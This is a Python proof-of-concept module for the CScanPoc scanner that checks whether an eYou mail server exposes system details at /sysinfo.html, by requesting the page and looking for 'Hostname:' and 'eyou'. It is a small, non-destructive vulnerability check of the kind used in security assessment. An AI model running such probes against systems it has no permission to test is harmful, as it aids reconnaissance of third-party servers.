# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'eYou_0003' # 平台漏洞编号，留空
    name = 'eYou /sysinfo.html 信息泄漏' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-11-21'  # 漏洞公布时间
    desc = '''
    Eyou sysinfo Information Disclosure.
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-061538
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Eyou'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ca82e07f-0566-4f2c-9307-2d8aaf82e21a' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            attack_url = self.target + '/sysinfo.html'
            request = urllib2.Request(attack_url)
            response = urllib2.urlopen(request)
            content = response.read()
            if 'Hostname:' in content and 'eyou' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()